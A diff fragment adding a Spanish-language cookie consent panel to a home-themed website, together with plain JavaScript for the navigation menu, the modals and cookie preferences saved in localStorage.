+            <p class="cookie-intro">
+
+                Puedes elegir qué categorías de cookies
+                deseas permitir. Las cookies necesarias
+                permanecen activas porque son necesarias
+                para determinadas funciones básicas del sitio.
+
+            </p>
+
+
+            <!-- NECESARIAS -->
+
+            <div class="cookie-category">
+
+                <div>
+
+                    <h4>
+                        Cookies necesarias
+                    </h4>
+
+                    <p>
+                        Son necesarias para recordar determinadas
+                        preferencias básicas y permitir el
+                        funcionamiento del sitio.
+                    </p>
+
+                </div>
+
+
+                <div>
+
+                    <span class="cookie-status">
+                        Siempre activas
+                    </span>
+
+                </div>
+
+            </div>
+
+
+            <!-- PREFERENCIAS -->
+
+            <div class="cookie-category">
+
+                <div>
+
+                    <h4>
+                        Cookies de preferencias
+                    </h4>
+
+                    <p>
+                        Permiten recordar determinadas preferencias
+                        seleccionadas por el visitante.
+                    </p>
+
+                </div>
+
+
+                <label class="cookie-toggle">
+
+                    <input type="checkbox"
+                           id="preferencesCookies">
+
+                    <span class="cookie-slider"></span>
+
+                </label>
+
+            </div>
+
+
+            <!-- ANALITICAS -->
+
+            <div class="cookie-category">
+
+                <div>
+
+                    <h4>
+                        Cookies analíticas
+                    </h4>
+
+                    <p>
+                        Pueden utilizarse para comprender de forma
+                        agregada cómo se utiliza el sitio y detectar
+                        oportunidades de mejora.
+                    </p>
+
+                </div>
+
+
+                <label class="cookie-toggle">
+
+                    <input type="checkbox"
+                           id="analyticsCookies">
+
+                    <span class="cookie-slider"></span>
+
+                </label>
+
+            </div>
+
+
+            <!-- PUBLICIDAD -->
+
+            <div class="cookie-category">
+
+                <div>
+
+                    <h4>
+                        Cookies publicitarias
+                    </h4>
+
+                    <p>
+                        Se utilizan únicamente cuando corresponda
+                        para tecnologías publicitarias y preferencias
+                        relacionadas con anuncios.
+                    </p>
+
+                </div>
+
+
+                <label class="cookie-toggle">
+
+                    <input type="checkbox"
+                           id="advertisingCookies">
+
+                    <span class="cookie-slider"></span>
+
+                </label>
+
+            </div>
+
+
+        </div>
+
+
+        <div class="cookie-panel-footer">
+
+            <button class="cookie-button"
+                    onclick="rejectCookies()">
+
+                Rechazar no esenciales
+
+            </button>
+
+
+            <button class="cookie-button primary"
+                    onclick="saveCookiePreferences()">
+
+                Guardar preferencias
+
+            </button>
+
+        </div>
+
+
+    </div>
+
+</div>
+
+
+
+<!-- =====================================================
+     COOKIE MANAGE BUTTON
+===================================================== -->
+
+<button class="cookie-manage"
+        id="cookieManage"
+        onclick="openCookieSettings()"
+        aria-label="Configurar cookies"
+        title="Configurar cookies">
+
+    🍪
+
+</button>
+
+
+
+<!-- =====================================================
+     JAVASCRIPT
+===================================================== -->
+
+<script>
+
+    /* =====================================================
+       MENU
+    ===================================================== */
+
+    function toggleMenu() {
+
+        const nav =
+            document.getElementById("mainNav");
+
+        nav.classList.toggle("active");
+
+    }
+
+
+    document
+        .querySelectorAll(".nav a")
+        .forEach(function(link) {
+
+            link.addEventListener(
+                "click",
+                function() {
+
+                    document
+                        .getElementById("mainNav")
+                        .classList
+                        .remove("active");
+
+                }
+            );
+
+        });
+
+
+    /* =====================================================
+       MODALES
+    ===================================================== */
+
+    function openModal(type) {
+
+        const modal =
+            document.getElementById(
+                "modal-" + type
+            );
+
+        if (!modal) return;
+
+        modal.classList.add("active");
+
+        document.body.style.overflow =
+            "hidden";
+
+    }
+
+
+    function closeModal(type) {
+
+        const modal =
+            document.getElementById(
+                "modal-" + type
+            );
+
+        if (!modal) return;
+
+        modal.classList.remove("active");
+
+        document.body.style.overflow =
+            "";
+
+    }
+
+
+    function closeOutside(event, type) {
+
+        if (
+            event.target.id ===
+            "modal-" + type
+        ) {
+
+            closeModal(type);
+
+        }
+
+    }
+
+
+    /* =====================================================
+       COOKIES
+    ===================================================== */
+
+    const COOKIE_KEY =
+        "tucasaaldia_cookie_preferences";
+
+
+    function getCookiePreferences() {
+
+        try {
+
+            const saved =
+                localStorage.getItem(
+                    COOKIE_KEY
+                );
+
+            if (!saved) {
+                return null;
+            }
+
+            return JSON.parse(saved);
+
+        } catch (error) {
+
+            return null;
+
+        }
+
+    }
+
+
+    function showCookieBanner() {
+
+        const banner =
+            document.getElementById(
+                "cookieBanner"
+            );
+
+        const manage =
+            document.getElementById(
+                "cookieManage"
+            );
+
+        if (banner) {
+            banner.classList.add("show");
+        }
+
+        if (manage) {
+            manage.classList.remove("show");
+        }
+
+    }
+
+
+    function hideCookieBanner() {
+
+        const banner =
+            document.getElementById(
+                "cookieBanner"
+            );
+
+        const manage =
+            document.getElementById(
+                "cookieManage"
+            );
+
+        if (banner) {
+            banner.classList.remove("show");
+        }
+
+        if (manage) {
+            manage.classList.add("show");
+        }
+
+    }
+
+
+    function acceptAllCookies() {
+
+        const preferences = {
+
+            necessary: true,
+
+            preferences: true,
+
+            analytics: true,
+
+            advertising: true,
+
+            savedAt:
+                new Date().toISOString()
+
+        };
+
+
+        localStorage.setItem(
+            COOKIE_KEY,
+            JSON.stringify(preferences)
+        );
+
+
+        hideCookieBanner();
+
+        closeCookieSettings();
+
+        applyCookiePreferences(
+            preferences
+        );
+
+    }
+
+
+    function rejectCookies() {
+
+        const preferences = {
+
+            necessary: true,
+
+            preferences: false,
+
+            analytics: false,
+
+            advertising: false,
+
+            savedAt:
+                new Date().toISOString()
+
+        };
+
+
+        localStorage.setItem(
+            COOKIE_KEY,
+            JSON.stringify(preferences)
+        );
+
+
+        hideCookieBanner();
+
+        closeCookieSettings();
+
+        applyCookiePreferences(
+            preferences
+        );
+
+    }
+
+
+    function saveCookiePreferences() {
+
+        const preferences = {
+
+            necessary: true,
+
+            preferences:
+                document.getElementById(
+                    "preferencesCookies"
+                ).checked,
+
+            analytics:
+                document.getElementById(
+                    "analyticsCookies"
+                ).checked,
+
+            advertising:
+                document.getElementById(
+                    "advertisingCookies"
+                ).checked,
+
+            savedAt:
+                new Date().toISOString()
+
+        };
+
+
+        localStorage.setItem(
+            COOKIE_KEY,
+            JSON.stringify(preferences)
+        );
+
+
+        hideCookieBanner();
+
+        closeCookieSettings();
+
+        applyCookiePreferences(
+            preferences
+        );
+
+    }
+
+
+    function applyCookiePreferences(
+        preferences
+    ) {
+
+        /*
+         * En esta versión no se cargan scripts
+         * de analítica o publicidad de terceros.
+         *
+         * Si posteriormente incorporas alguno,
+         * debes cargarlo únicamente cuando la
+         * categoría correspondiente esté autorizada.
+         */
+
+        window.cookiePreferences =
+            preferences;
+
+    }
+
+
+    /* =====================================================
+       COOKIE SETTINGS
+    ===================================================== */
+
+    function openCookieSettings() {
+
+        const settings =
+            document.getElementById(
+                "cookieSettings"
+            );
+
+        const saved =
+            getCookiePreferences();
+
+
+        if (saved) {
+
+            document.getElementById(
+                "preferencesCookies"
+            ).checked =
+                saved.preferences === true;
+
+
+            document.getElementById(
+                "analyticsCookies"
+            ).checked =
+                saved.analytics === true;
+
+
+            document.getElementById(
+                "advertisingCookies"
+            ).checked =
+                saved.advertising === true;
+
+        } else {
+
+            document.getElementById(
+                "preferencesCookies"
+            ).checked = false;
+
+
+            document.getElementById(
+                "analyticsCookies"
+            ).checked = false;
+
+
+            document.getElementById(
+                "advertisingCookies"
+            ).checked = false;
+
+        }
+
+
+        settings.classList.add("show");
+
+        document.body.classList.add(
+            "cookie-open"
+        );
+
+    }
+
+
+    function closeCookieSettings() {
+
+        const settings =
+            document.getElementById(
+                "cookieSettings"
+            );
+
+        settings.classList.remove("show");
+
+        document.body.classList.remove(
+            "cookie-open"
+        );
+
+    }
+
+
+    /* =====================================================
+       CLICK FUERA DEL PANEL
+    ===================================================== */
+
+    document
+        .getElementById("cookieSettings")
+        .addEventListener(
+            "click",
+            function(event) {
+
+                if (
+                    event.target ===
+                    this
+                ) {
+
+                    closeCookieSettings();
+
+                }
+
+            }
+        );
+
+
+    /* =====================================================
+       ESC
+    ===================================================== */
+
+    document.addEventListener(
+        "keydown",
+        function(event) {
+
+            if (event.key === "Escape") {
+
+                closeModal("privacidad");
+
+                closeModal("terminos");
+
+                closeModal("aviso");
+
+                closeCookieSettings();
+
+            }
+
+        }
+    );
+
+
+    /* =====================================================
+       INICIALIZACIÓN
+    ===================================================== */
+
+    document.addEventListener(
+        "DOMContentLoaded",
+        function() {
+
+            const saved =
+                getCookiePreferences();
+
+
+            if (!saved) {
+
+                showCookieBanner();
+
+            } else {
+
+                applyCookiePreferences(
+                    saved
+                );
+
+                const manage =
+                    document.getElementById(
+                        "cookieManage"
+                    );
+
+                if (manage) {
+                    manage.classList.add(
+                        "show"
+                    );
+                }
+
+            }
+
+        }
+    );
+
+</script>
+
+
 </body>
 </html>
-```
+        
